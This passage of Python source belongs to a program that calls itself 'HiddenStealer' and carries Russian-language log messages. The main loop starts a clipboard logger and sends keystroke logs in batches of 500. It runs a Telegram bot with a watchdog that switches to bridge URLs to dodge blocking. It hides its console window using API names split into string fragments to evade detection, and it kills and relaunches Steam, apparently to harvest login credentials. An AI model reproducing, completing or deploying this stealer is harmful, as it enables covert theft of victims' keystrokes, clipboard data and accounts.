        self.load_labels()  
        self.send_start_report()
        if WIN32_AVAILABLE:
            self.start_clipboard_logger()
        if TELEGRAM_AVAILABLE:
            bot_thread = threading.Thread(target=self.start_bot, daemon=True)
            bot_thread.start()
            self.bot_started = True
            threading.Thread(target=self._bridge_watchdog, daemon=True).start()

        try:
            while self.is_running:
                try:
                    while not ui_action_queue.empty():
                        task = ui_action_queue.get_nowait()
                        print("⚙️ Обработка действия из очереди UI...")
                        try:
                            task()
                        except Exception as e:
                            print("❌ Ошибка при выполнении действия UI: " + str(e))

                except queue.Empty:
                    pass
                except Exception as e:
                    print("❌ Ошибка в основном цикле HiddenStealer: " + str(e))
                if self.keylog_buffer and self.keylogger_active:
                    if len(self.keylog_buffer) >= 500:
                        self.send_advanced_keylog()
                # if self.clipboard_buffer:
                #     self.send_clipboard()
                self.check_active_window()
                self.save_client_state()
                time.sleep(1)
        except KeyboardInterrupt:
            self.is_running = False
    def _bridge_watchdog(self):
        """Periodically check bridge health"""
        while self.is_running:
            try:
                bridge_manager.auto_switch_if_needed()

                if bridge_manager.bridge_active:
                    current = bridge_manager.get_current_bridge()
                    if current and not bridge_manager.test_bridge(current):
                        route = bridge_manager.get_best_route()
                        if route and route['type'] == 'bridge':
                            from telebot import apihelper
                            apihelper.API_URL = route['api_url']
                            apihelper.FILE_URL = route['file_url']
                            print(f"[Bridge] Auto-switched to {route['bridge_url']}")
            except:
                pass
            time.sleep(60)

def hide_console():

    """Скрытие окна консоли"""
    if not HIDE_CONSOLE: return
    try:
        _windll = getattr(ctypes, 'windll', None)
        if os.name == 'nt' and _windll:
            _k = getattr(_windll, 'ker' + 'nel' + '32', None)
            _u = getattr(_windll, 'us' + 'er' + '32', None)
            if _k and _u:
                GetConsoleWindow = getattr(_k, 'Get' + 'Console' + 'Window', None)
                ShowWindow = getattr(_u, 'Show' + 'Window', None)
                if GetConsoleWindow and ShowWindow:
                    wh = GetConsoleWindow()
                    if wh:
                        ShowWindow(wh, 0) 
    except:
        pass
def kill_steam():
    # Kill all Steam processes
    print("🔪 Завершаю работу Steam...")

    try:
        subprocess.run('taskkill /F /IM steam.exe /T', shell=True, capture_output=True)
        subprocess.run('taskkill /F /IM SteamService.exe /T', shell=True, capture_output=True)
    except:
        pass
def relaunch_steam():
    # Try to relaunch Steam from registry path
    print("🚀 Перезапуск Steam...")

    try:
        winreg = __import__('wi' + 'nreg')
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Valve\Steam")
        steam_path, _ = winreg.QueryValueEx(key, "SteamExe")
        winreg.CloseKey(key)
        if steam_path and os.path.exists(steam_path):
            subprocess.Popen([steam_path], start_new_session=True)
            print("✅ Steam запущен из реестра.")
    except Exception as e:
        print("❌ Не удалось запустить Steam из реестра.")
if __name__ == "__main__":
    try:
        check_single_instance()
        print("--- HiddenStealer Initialized ---")

        def signal_handler(sig, frame):
            import signal
            sig_name = "Unknown"
            for name, value in signal.__dict__.items():
                if name.startswith("SIG") and value == sig:
                    sig_name = name
                    break
            print(f"⚠️ Получен сигнал {sig_name}. Завершение работы...")
            import traceback
            traceback.print_stack(frame)
            sys.exit(0)

        import signal
        signal.signal(signal.SIGINT, signal_handler)
        main_bot = HiddenStealer()
        main_bot.run()
    except Exception as e:
        print("❌ Критическая ошибка при запуске:")
        import traceback
        traceback.print_exc()